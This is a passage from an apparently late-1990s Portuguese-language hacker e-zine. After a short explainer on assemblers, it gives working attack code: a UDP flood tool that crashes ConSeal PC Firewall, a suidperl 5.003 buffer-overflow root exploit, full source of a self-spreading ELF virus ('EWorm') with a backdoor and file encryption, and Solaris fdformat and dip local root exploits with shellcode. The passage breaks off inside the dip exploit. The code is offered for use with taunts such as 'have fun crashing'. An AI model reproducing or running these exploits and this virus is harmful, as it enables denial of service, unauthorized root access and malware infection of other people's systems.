+e procura-o na tabela de codigos de operacao para encontrar seu equivalente
+na linguagem de maquina. Da mesma forma ele lH AX e encontra-o na tabela
+correspondente como sendo um registrador. O processo para Var e um pouco
+diferenciado, o montador verifica que ela nao e uma palavra reservada,
+entao procura na tabela de simbolos, la  encontrando-a ele designa o
+endereco correspondente, mas se nao encontrou ele a insere na tabela para
+que ela possa receber um endereco na segunda passagem. Ainda na primeira
+passagem e executado parte do processamento das diretivas, e importante 
+notar que as diretivas nao criam codigo objeto. Na passagem dois sao
+montadas as instrucoes, traduzindo os codigos de operacao e procurando
+os enderecos, e e gerado o codigo objeto.
+
+os simbolos que o montador nao consegue encontrar, uma vez que podem ser
+declaracoes externas. Neste caso o linker entra em acao para criar a
+estrutura necessaria a fim de ligar as diversas possiveis partes de codigo,
+dizendo ao loader que o segmento e o token em questao sao definidos quando
+o programa e carregado e antes de ser executado.
+
+
+      Hunter^Heads               HunterH@deathknights.com
+      `'`'`'`'`'`'               `'`'`'`'`'`'`'`'`'`'`'`'
+
+-=[  8  ]=-
+.------------------------.
+| ConSeal PC Firewall DoS \__________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+Muita gente diz que este firewall e' o mais seguro... sera'? Pode ser, sei la,
+nunca usei... mas que as versoes dele ate a 1.2 sao vulneraveis a um Denial Of
+Service. Voce pode prestar atencao, para se divertir, que quase todos os
+lugares que usam este firewall nos dias de hoje sao vulneraveis. 
+
+O dos e' simples... o firewall somente nao tem mais onde alocar os dados que
+chegam muito rapidamente, usando todos os recursos disponiveis. Entao, a
+maquina trava. Mais ou menos de 10 a 30 segundos depois da maquina ter
+travado, se o ataque continuar ira resetar a maquina.
+
+Como se proteger? E' tao simples como o dos... basta voce desabilitar os
+modos 'Learning' e o 'Logging'. Ou pegue uma versao mais recente do que a
+1.2.
+
+Aih vai o sorce que causa o dos...
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/* Saihyousen Attack (*Japanese* Ice Breaker), By Noc-Wage (M.C.S.R)
+ * Base code from arnudp.c but HEAVILY modified. Originally written
+ * sometime early April 1998, I'm a little fuzzy as to the date.
+ * Written by Max Schau <wage@idirect.ca.>
+ *
+ *                                 [ http://www.deathknights.com ]
+ *
+ */
+
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netinet/in_systm.h>
+#include<netinet/in.h>
+#include<netinet/ip.h>
+#include<netinet/udp.h>
+#include<errno.h>
+#include<strings.h>
+#include<netdb.h>
+#include <stdlib.h>
+#include<stdio.h>
+#ifdef BROKEN_LIBC
+#include <arpa/inet.h>
+#else
+#define u_char unsigned char
+#define u_short unsigned short
+#endif
+
+struct sockaddr sa;
+
+int main(int argc,char **argv)
+{
+int fd;
+int x=1;
+int hosti=192;
+int hostii=168;
+int hostiii=1;
+int meep=0;
+int fooport=1;
+int numpack=0;
+char funhost[15];
+struct sockaddr_in *p;
+struct hostent *he;
+u_char gram[36]=
+ {
+ 0x45, 0x00, 0x00, 0x26,
+ 0x12, 0x34, 0x00, 0x00,
+ 0xFF, 0x11, 0, 0,
+ 0, 0, 0, 0,
+ 0, 0, 0, 0,
+
+ 0, 0, 0, 0,
+ 0x00, 0x12, 0x00, 0x00,
+
+ '3','1','3','3','7','8','9','0'
+ };
+
+if(argc!=3)
+ {
+ fprintf(stderr,"Saihyousen, by Noc-Wage\n");
+ fprintf(stderr,"The faster your connection to the internet is (latency
+wise, not bandwidth)\n");
+ fprintf(stderr,"and the lower the CPU speed of the victim
+will\nincrease probability of success\n");
+ fprintf(stderr,"usage: %s victim num_of_packets Ex: saihyousen
+127.0.0.1 40000\n",*argv);
+ exit(1);
+ };
+if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
+ {
+ perror("requires RAW SOCKETS");
+ exit(1);
+ };
+
+#ifdef IP_HDRINCL
+if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
+ {
+ perror("setsockopt IP_HDRINCL");
+ exit(1);
+        };
+#else
+fprintf(stderr,"we don't have IP_HDRINCL :-(\n\n");
+#endif
+
+for (numpack=0;numpack<=atoi(argv[2]);numpack++) {
+ if (meep==0) { ++hosti; meep++; }
+ if (hosti>254) hosti=1;
+ if (meep==1) { ++hostii; meep++;}
+ if (hostii>254) hostii=1;
+ if (meep==2) { ++hostiii; meep=0;}
+ if (hostiii>254) hostiii=1;
+
+sprintf( funhost, "%i.%i.%i.%i",hosti,hostii,hostiii,hosti);
+(he=gethostbyname(funhost));
+bcopy(*(he->h_addr_list),(gram+12),4);
+
+if((he=gethostbyname(argv[1]))==NULL)
+ {
+ fprintf(stderr,"can't resolve destination hostname\n");
+ exit(1);
+ };
+bcopy(*(he->h_addr_list),(gram+16),4);
+fooport++;
+/* resets the port to 1 if it's nearing the end of possible values */
+if (fooport>65530) {fooport=1;};
+*(u_short*)(gram+20)=htons((u_short)fooport);
+*(u_short*)(gram+22)=htons((u_short)fooport);
+
+p=(struct sockaddr_in*)&sa;
+p->sin_family=AF_INET;
+bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));
+
+if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct
+sockaddr)))== -1)
+ {
+ perror("sendto");
+ exit(1);
+ };
+};
+printf("Attack against %s finished", argv[1]);
+putchar('\n');
+return 1;
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+Se divirtam travando por ae :P
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  9  ]=-
+.-------------------.
+| Perl 5.004 exploit \_______________________________________________________
+`----------------------------------------------------------------------------'
+                               by Cacaio
+
+Auqlauqer usuario pode ter privilegios de root em um sistema linux que tenha
+suidperl 5.003 (tendo o suid bit, duh!) mesmo se tiver sido patcheado.
+
+      .----------------------.  
+      |  Como arrumar isto?   `----------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+chmod u-s /usr/bin/sperl5.003  (o que mais fazer? atualizar)
+
+
+      .---------------.  
+      |  Detalhes...   `-----------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Tem um bugzinho em mess() [util.c]: e' possivel fazer um overflow no buffer
+(por sprintf()); mess() tenta detectar a situacao mas nao consegue aguentar
+o problema da forma correta.
+
+[extraido do util.c]
+
+    if (s - s_start >= sizeof(buf)) {   /* Ooops! */
+        if (usermess)
+            fputs(SvPVX(tmpstr), stderr);
+        else
+            fputs(buf, stderr);
+        fputs("panic: message overflow - memory corrupted!\n",stderr);
+        my_exit(1);
+    }
+
+Logo depois disso, ele nao termina imediatamente. Ele imprime uma mensagem
+de erro e chama my_exit(1), o que nao e' nada bom.
+
+
+
+Observe o seguinte:
+
+$ perl -v
+This is perl, version 5.003 with EMBED
+        Locally applied patches:
+          SUIDBUF - Buffer overflow fixes for suidperl security
+
+        built under linux at Apr 22 1997 10:04:46
+        + two suidperl security patches
+
+$ perl `perl -e "print 'A' x 3000"`
+Can't open perl script "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+...AAAAAAAAAAAAAAAAA": File name too long
+panic: message overflow - memory corrupted!
+
+$ Can't open perl script "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+...AAAAAAAAAAAAAAAAA": File name too long
+panic: message overflow - memory corrupted!
+Segmentation fault (core dumped)
+
+$ gdb /usr/bin/perl core
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.16 (i586-unknown-linux), Copyright 1996 Free Software Foundation,
+Inc...
+(no debugging symbols found)...
+Core was generated by `perl AAAAA...'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols ...
+...
+#0  0x41414141 in ?? ()
+(gdb)
+
+Ai esta! 0x41414141 == "AAAA"
+
+A variavel chamada top_env foi sobreescrita. De fato, e' a jmp_buf e o
+Perl chama longjpm() com ele em algum lugar no my_exit().
+
+
+Ta ai' um codigo pra exploitar isto:
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+#!/usr/bin/perl
+
+$| = 1;
+
+$shellcode =
+  "\x90" x 512 .            # nops
+  "\xbc\xf0\xff\xff\xbf" .  # movl $0xbffffff0,%esp
+  # "standard shellcode" by Aleph One
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+# start and end of .data
+# adjust this using /proc/*/maps
+
+$databot = 0x080a2000;
+$datatop = 0x080ab000;
+
+# trial and error loop
+
+$address = $databot + 4;
+
+while ($address < $datatop) {
+  $smash_me =
+    $shellcode . ('A' x (2052 - length($shellcode))) .
+    (pack("l", $address) x 1000) . ('B' x 1000);
+  $pid = fork();
+  if (!$pid) {
+    exec('/usr/bin/sperl5.003', $smash_me);
+  }
+  else {
+    wait;
+    if ($? == 0) {
+      printf("THE MAGIC ADDRESS WAS %08x\n", $address);
+      exit;
+    }
+  }
+  $address += 128;
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+Usem como quiserem... e esperem pelo root! :)
+
+O perl 5.004 nao e' vulneravel.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  10  ]=-
+.--------------.
+| EWorm Project \____________________________________________________________
+`----------------------------------------------------------------------------'
+                               by sm0g
+
+ .iNTRODUCAO.
+
+      O EWorm eh um simples "virus" originalmente destinado - mas nao limita- 
+ do - a infectar arquivos ELF. John V. (Antionline asshole) costuma dizer que
+ atualmente, primeiro os duhdinhas invadem um  sistema e alteram o site, para
+ soh entao, pensar numa justificativa socio-politica para tal irresponsabili-
+ dade. Assim, digamos que o objetivo do EWorm seja o de realcar as necessida-
+ des de uma  monitoracao constante do sistema, bem como o de suas respectivas
+ permissoes :)  Alem de apresentar ao leior o funcionamento basico desse tipo
+ de virus, iremos brevemente discutir os possiveis  efeitos que um codigo bem
+ escrito e disseminado poderia causar.   
+      Me esforcei ao maximo para evitar erros e equivocacoes (e tornar o tex-
+ to o mais digestivel possivel), mas ainda considero  isso longe do sufiente.
+ Caso voce tenha algo a acrescentar, discutir, e principalmente corrigir, nao
+ hesite em me contactar. Futuras atualizacoes desse projeto podem ser vistas
+ no site da TAff, www.psynet.net/taff .
+
+
+ .Elf Worm.
+
+      O EWorm usa como tecnica de infeccao um mecanismo que ja mostrou eficaz
+ em diversos codigos, como  por exemplo o virus VLPI da SVTA (que conseguiram 
+ complicar algo  bem simples): o redirecionamento binario. Facil de implemen-
+ tar, o redbin pode ser considerado  quase que multi-operacional, podendo ser
+ utilizado em *qualquer* OS que  suporte tal redirecionamento. Como essa tec-
+ nica foge do objetivo desse texto, recomendo - sem querer "puxar a linguica"
+ pro meu lado, mas o txt ajuda bastante - que os interessados deem uma rapida
+ olhada em:  www.psynet.net/taff/files/b2.prj
+ Como nem tudo eh perfeito, o redbin nao pode ser considerado 100% confiavel.
+ Um dos poucos "probleminhas significativos" que merecem ser levantados, eh o
+ fato de que *sob certas condicoes* o metodo pode ser notado em programas que
+ utilizam o path para retornar algum erro em stdout, como por exemplo no caso
+ de /bin/ls. Ilustrando essa situacao, teriamos algo assim:
+      - O virus redireciona seus binarios limpos para /tmp, e roda-os lah; No
+ caso de um "ls" mal-sucedido, seria retornado o seguinte:
+
+ #ls d*
+ /tmp/ls: d* not found
+
+ Dos varios metodos testados para corrigir isso, um dos poucos que apresenta-
+ ram resultados significantes, usava certos acessos a memoria, que um usuario
+ comum nao seria habilitado a fazer, ainda mais no caso do programa ser remo- 
+ tamente acessado (exemplo: /bin/login). Testei outros mecanismos de infeccao
+ como por exemplo a de processos (feito tambem pela SVAT), mas alem de imenso
+ o codigo nao eh nenhum pouco multi-OS. Por hora, eu ainda considero o redbin
+ algo bastante eficiente (..)
+      Tendo em mente que antes de mais nada um virus deve ser pequeno, ao in-
+ ves de elaborar todas as rotinas em C, e reinventar a roda (aumentando muito
+ o tamanho do codigo), optei por "sujar" o virus  com alguns system(), que me
+ salvaram preciosos bytes. O virus tem um tamanho relativamente  pequeno (que
+ pode ser ainda menor, mas isso eh por conta do leitor), se visto os recursos
+ utilizados. Nessa versao (publica), ocorre verificacao de arquivos (certifi-
+ ca-se que eh um ELF autentico, e ainda nao foi infectado); nao altera atime/
+ mtime, e nem as permissoes do arquivo; encripta as vitimas; "escaneia" dire-
+ torios (pre-definidos), e usa uma backdoor rudimentar, que ajuda no processo
+ de infeccao. Para ocupar ainda menos espaco, muitos tratamentos a erro foram
+ suprimidos, mas tenho certeza que nao teremos maiores problemas :P
+ Um virus simples poderia facilmente ter menos da metade do tamanho do EWorm,
+ mas dificilmente se propagaria de forma eficiente, ainda mais no caso de am-
+ biente Unix.
+
+      A backdoor eh bem simples: a ideia inicial era  de simplemente instalar
+ uma SUID shell, mas ela nao transfere a UID 0 ao virus (pid) em  execucao. A
+ saida foi instalar o codigo bruto  num arquivo (ja definido), e roda-lo nor-
+ malmente. O interessante em se fazer isso - existem tecnicas muito melhores,
+ mas como criador, eu  nao posso dar o braco a torcer he he he - esta na eco-
+ nomia de espaco, e no fato do admin nao  cair num prompt quando estiver che-
+ cando aquele estranho arquivo SUID 0.
+      Cript() eh igualmente  simples. Nosso algoritmo, acronicamente chamado
+ de 3Kfe (3 Key File Encription), usa 3 chaves  distintas: a primeira informa
+ o numero de bytes a encriptar, a outra diz quantas vezes serao rotacionados,
+ e a ultima diz em que posicao o pointer vai iniciar a leitura dos dados man-
+ dados a primeira variavel.
+ Problemas para os AV's, pois para desinfectar um arquivo, eles terao de des-
+ cobrir onde  comeca e onde termina o "corrompimento do arquivo", ou entao se
+ dedicar a maravilhosas horas  de brute-force, que num arquivo grande vao dar
+ um trabalho  e tanto (eu sei que eles podem seguir o virus, mas deixe eu me
+ iludir um pouquinho..).
+
+
+ .Riscos, blah blah.. e outras coisas mais..
+
+      A Internet Worm de R. Morris, era um complexo conjunto de arquivos cujo
+ unico objetivo era o de se copiar para o maior  numero possivel de sistemas.
+ Apesar  de nao ser multi-OS (rodava em Sun Microsystems Sun-3 workstations e
+ VAX computers com uma  variante da versao 4 do Berkeley Unix), a worm se ex-
+ pandiu de forma chocante.
+      Me parece que o numero de exploits existentes e disponiveis em 1988 era
+ ligeiramente menor que os de hoje... Os sistemas abertos e administrados por
+ pessoas incompetentes, hoje sao maiores, e a grande Rede cresce a cada dia,
+ aumentando ainda mais o numero de vitimas potencias.
+ Eu fiz aqui uma  variante do Eworm chamada de Brasilix, que alem de um nasty
+ code, tem algumas rotinas e modificacoes a mais, como  por exemplo sniffing.
+ O Brasilix se mostrou *muito* infeccioso, e seu tamanho nao excedeu muito as
+ espectativas. Eh recomendavel o uso de shells mais seguras (ex. SSH), ou num
+ futuro proximo, a tendencia eh que os desastres aumentem.
+
+
+ .Install - caso alguem queira testar Eworm, para propostitos educacionais =)
+
+ 	Recomendo executar esse procedimentos via UID!=0, pois  nao acho sau-
+ davel rodar isso como root. Inicialmente, crie um diretorio e copie para ele
+ o eworm.c, e algum arquivo binario que voce deseje infectar. Compile e rode
+ o eworm normalmente.  
+        O codigo encontra-se ao final da materia.
+
+
+ .FAQ
+
+ Abaixo vao respostas para  alguns mails que recebemos de beta-testers, viti-
+ mas e outras pessoas que tiveram acesso ao programa.
+
+ 1) Eu compilei o eworm (gcc -o eworm eworm.c) e infectei um arquivo binario,
+ mas roda-lo, o proprio eworm foi infectado! O mais estranho eh que ao tentar
+ rodar o virus novamente (apos ser infectado) ele travou. Porque?
+   R: Entenda que o virus eh  um arquivo normal, e apesar de conter o codigo
+ bruto em si, ele ainda nao possui a  marcacao de infectado ('EW'), e por is-
+ so eh normalmente  contaminado. O fato dele travar, eh porque por operar por
+ loop's (while's, etc), quando voce  roda um virus dentro  de outro, ele meio
+ que se perde, e "trava" (na realidade ele nao trava, apenas fica loopando)..
+
+ 2) O EWorm possui alguma fraqueza ou bug mais grave?
+   R: Como todo programa que se preze, o EWorm tambem tem bugs! Alguns sao
+ faceis de se corrigir, deixados no codigo publico  apenas para "facilitar" a
+ vida dos duhdinhas que vao rodar o virus sem ao menos entender o que ocorre.
+ Abaixo vai uma relacao do que (segundo  minha opiniao) deve ser corrigido, e
+ como "fixar" o problema.. Note que nenhum desses probleminhas pode comprome-
+ ter o funcionamento do virus! Ele apenas nao ira rodar tao bem..
+ 
+ - Se o parent process durar mais do que o child, ele ainda estaram "lockado"
+ quando o child executar  um remove! Isso eh muito importante de se corrigir,
+ para evitar rastros. Eh uma simples questao de se redirecionar o signal para
+ um remove() :P  
+
+ 3) Quando o Brasilix, ou uma versao plena do EWorm sera liberada?
+   R: Nos nao temos planos de fazer isso. A nossa versao privada do EWorm jah
+ foi suficientemente modificada para evitar av's que se baseiem no codigo pu-
+ blico. Divulgar o nosso trabalho ira apenas prejudicar o bichano :)
+
+ 4) A tecnica de backdoor pode ser mudada?
+   R: A grande vantagem do EWorm, eh que apesar de um codigo que a primeira
+ vista parece "meio confuso", altera-lo eh algo muito simples. Qualquer roti-
+ na pode ser alterada. Note porem, que estamos falando de  um virus, e nao eh
+ bom abusar do tamanho.
+
+ 5) O EWorm roda em que sistemas operacionais?
+   R: Aparentemente ele funciona bem em sistemas Linux (objetivo primario), e
+ compativeis. Ouvi dizer que ele tambem eh bastante estavel em SunOS, Digital
+ e System V. Caso alguem tenha algo a acrescentar ou retirar, reply..
+
+ 7) O virus foi disseminado?
+   R: Sim e nao. O codigo pode ser facilmente alterado, podendo estar sendo
+ distribuido por alguem, nesse exato momento. Alem disso, estou com um estra-
+ nho pressentimento a respeito dos hosts gov.br / mil.br. Melhor esse pessoal
+ tomar cuidado.. talvez, muito cuidado sera o ideal.
+
+ 8) Porque voces divulgaram apenas o codigo publico (que esta bugado)? Vai
+ ver voces nao conseguiram terminar o virus, e estao esperando que alguem fa-
+ ca o trabalho sujo por voces..
+   R: Essa perguntinha nos recemos de um certo administrador.. A razao eh bem
+ simples: nos somos egoistas e nao queremos perder horas de trabalho, desper-
+ dicada na mao de lamers irresponsaveis, ou de AV's. Se voce  duvida da nossa
+ capacidade, foda-se. Nos nao temos que lhe provar nada, o codigo fala por si
+ proprio.
+
+ 9) Porque usar "#define vTAM", se o tamanho do virus pode mudar dependendo
+ do compilador utilizado na compilacao de eworm.c? O codigo nao fica tao por-
+ tavel, fica?
+   R: dumped da Uground disse que o ideal seria utilizar um fseek  e ftell ao
+ inves de apelar para um define, tornado assim o codigo  mais profissional e
+ portavel. Acontece, que uma rotina dessa, alem de aumentar o numero de aces-
+ so ao  disco (sim, o acesso eh insignificante, mas ainda existe), aumentaria
+ o codigo em alguns bons bytes. Eu ainda  prefiro compilar, ver o size, mudar
+ no #define e recompilar, do que apelar pra isso... estamos fazendo um virus,
+ ele nao precisa ser portavel. O codigo teria de ser +- assim (fiz de cabeca,
+ isso eh apenas pra voce ter uma ideia):
+
+ FILE *fp;
+ int vTAM;
+ fp=fopen(argv[0],"r");
+ fseek(fp,0,SEEK_END);
+ vTAM=ftell(fp);
+ 
+ Acho que isso deve resolver para os mais "profissionais"  =)
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/*
+   Elf Worm Project
+   Copyright (c) 1998, Dr.sm0g [TAff]
+   Techno Affliction iNC. Made in Brasil.
+   sm0g@psynet.net / taff@psynet.net
+
+  "Aos que sabem, nada precisa ser dito.
+   Aos que nao sabem, menos ainda, pois nunca
+   estao disposto a escutar."
+
+   TAff Labs: Internet Terrorism trought source code >:]
+
+
+   eworm.c
+*/
+
+#include <fcntl.h>
+#include <utime.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+
+#define vTAM 28525           /* gcc -O -o eworm eworm.c size.. */
+
+FILE *fp;
+DIR *dirp;
+long int icnt,bd,i;
+char Elf[5]={0x7f,0x45,0x4c,0x46,'\0'},
+     Ebuf[5]={'\0'},ID[3]={0x45,0x57,'\0'},
+     Path[50],Buff[100],Ntm[30],Nom[30]="/tmp/";
+
+struct dirent *dirf;
+struct stat info,*ip;
+struct utimbuf dtime;
+
+
+main(int argc,char *argv[],char *envp[])
+{
+  getcwd(Path,30);
+  strcat(Nom,argv[0]);
+  strcat(strcat(Path,"/"),argv[0]);
+  stat(argv[0],ip=&info);
+
+  if((getuid()==0)&&(ip->st_size==vTAM)) bd=1;
+
+  if((bd==0)&&(ip->st_size!=vTAM)&&(fork())) {
+    sprintf(Buff,"tail -c%ld %s>%s",(ip->st_size)-vTAM,argv[0],Nom);
+    Cript(argv[0],2); PrnMod(Nom);
+    execve(Nom,argv,envp); }
+
+  else {
+    if((getuid()==0)&&(ip->st_size!=vTAM)) {
+      sprintf(Buff,"head -c%ld %s>/tmp/backd",(ip->st_size)-vTAM,argv[0]);
+      system(Buff); }
+
+    if((getuid()!=0)&&(access("/bin/backd",F_OK))==0) {
+      system("/bin/backd"); exit(0); }
+
+    dirp=opendir(".");
+    do
+    {
+      if(((dirf=readdir(dirp))==NULL)&&(icnt!=2)) {
+        if(chdir(bd==1?"/bin":getenv("HOME"))==0) {
+          icnt++; dirp=opendir(".");
+          dirf=readdir(dirp); }
+        else {
+          break; }
+      }
+
+      if(access(dirf->d_name,R_OK|W_OK|X_OK)==0)
+      {
+        stat(dirf->d_name,&info);
+        if(((info.st_mode&S_IFMT)==S_IFREG))
+        {
+          fp=fopen(dirf->d_name,"r+");
+          fread(Ebuf,4,1,fp);
+          if(strcmp(Ebuf,Elf)==0)
+          {
+            bzero(Ebuf,4);
+            fseek(fp,-2,SEEK_END);
+            fread(Ebuf,2,1,fp);
+            if(strcmp(Ebuf,ID)!=0)
+            {
+              fseek(fp,0,SEEK_END);
+              fwrite(ID,2,1,fp); fclose(fp); icnt++;
+              strcat(strcat(Ntm,"/tmp/"),dirf->d_name);
+              sprintf(Buff,"head -c%i %s>%s;cat %s>>%s",\
+              vTAM,Path,Ntm,dirf->d_name,Ntm);
+              Cript(dirf->d_name,1);
+              sprintf(Buff,"cp %s .;rm %s",Ntm,Ntm); system(Buff);
+
+              dtime.actime=info.st_atime;
+              dtime.modtime=info.st_mtime;
+              utime(dirf->d_name,&dtime);
+              PrnMod(dirf->d_name);
+              bzero(Ntm,30);
+            }  /* if ID     */
+          }  /* if ELF     */
+        }  /* if(access.. */
+      }  /* if(stat)     */
+    } while((dirf!=NULL)&&(icnt<=2));
+  }  /* fork()         */
+
+  remove(Nom);
+}  /* main()          */
+
+
+/* --- funcoes adicionais --------------------------------------- */
+
+PrnMod(char *arq)
+{
+  i=chmod(arq,info.st_mode);
+  i=chown(arq,info.st_uid,info.st_gid);
+}
+
+Cript(char *arq,int opt)
+{
+  /* KEY=chave da encriptacao, NUM=# bytes a encriptar */
+  long int len=strlen(arq),KEY=(len+2)*3,NUM=(len*7)-5,Ep[NUM];
+
+  /* chave1: vTAM+strlen(arq)*8=# bytes a deslocar o ponteiro      */
+  fp=fopen(arq,"r+");
+  fseek(fp,vTAM+strlen(arq)*8,SEEK_SET);
+
+  for(i=0;i<NUM;i++) {
+    Ep[i]=fgetc(fp);
+    fseek(fp,-1,SEEK_CUR);
+    fprintf(fp,"%c",(opt==1?++Ep[i]*KEY:--Ep[i]*KEY));
+   }
+  fclose(fp);
+  system(Buff);
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+     sm0g                  sm0g@psynet.net
+     `'`'                  `'`'`'`'`'`'`'`
+
+
+-=[  11  ]=-
+.---------------------.
+| Exploits to get root \________________________________________________________
+`----------------------------------------------------------------------------'
+                                by ReNeGaDe
+
+       Hi all! Nessa materia pretendi falar e colocar exploits para conseguir
+accesso de root. Mais para que voce possa usar os mesmo ter  que ter uma conta
+no alvo para que possa ser feito o ataque.
+
+1) Dois exploits para Solaris..
+
+1.1) Exploit para Solaris ver. 2.4
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+/*
+ * The Death Knights www.deathknights.com  
+ * by ReNeGaDe - ReNeGaDe@DeathKnights.com
+Solaris 2.4
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define BUF_LENGTH 264
+#define EXTRA 36
+#define STACK_OFFSET -56
+#define SPARC_NOP 0xa61cc013
+
+u_char sparc_shellcode[] =
+
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+  "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14" 
+  "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc" 
+  "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01" 
+  "\x91\xd0\x20\x08";
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA + 8];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),dso=0;
+
+  if(argc > 1) dso=atoi(argv[1]);
+
+  long_p =(u_long *) buf ;
+  targ_addr = get_sp() - STACK_OFFSET - dso;
+
+  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++) *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i < code_length; i++)
+  *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+  for (i = 0; i < EXTRA / sizeof(u_long); i++) *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n", targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET); 
+  execl("/bin/fdformat", "fdformat   ", &buf[0],(char *) 0);
+  perror("execl failed");
+}
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+
+1.2) Exploit para Solaris ver. 2.5.1
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+/*
+ * The Death Knights www.deathknights.com  
+ * by ReNeGaDe - ReNeGaDe@DeathKnights.com
+Solaris 2.5.1 - this exploited was compiled on Solaris2.4 and tested on 2.5.1
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define BUF_LENGTH 364
+#define EXTRA 400
+#define STACK_OFFSET 704
+#define SPARC_NOP 0xa61cc013
+
+u_char sparc_shellcode[] =
+
+  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68" 
+  "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14" 
+  "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc" 
+  "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01" 
+  "\x91\xd0\x20\x08";
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA + 8];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),dso=0;
+
+  if(argc > 1) dso=atoi(argv[1]);
+
+  long_p =(u_long *) buf ;
+  targ_addr = get_sp() - STACK_OFFSET - dso;
+  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++) *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i < code_length; i++)
+  *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+  for (i = 0; i < EXTRA / sizeof(u_long); i++) *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n", targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET); 
+  execl("/bin/fdformat", "fdformat", & buf[1],(char *) 0);
+  perror("execl failed");
+}
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+2) Exploit testado para conseguir accesso de root usando o dip.
+
+Note: Nao esqueca de apagar o arquivo temp.dip quando rodar este exploit.
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+/* dip-exploit.c - overruns the buffer in do_chatkey() to give a shell */
+ * The Death Knights www.deathknights.com  
+ * by ReNeGaDe - ReNeGaDe@DeathKnights.com
+ */
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+
+#define PATH_DIP "/usr/sbin/dip"
+
+u_char shell[] = /* courtesy of avalon  ;) */
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
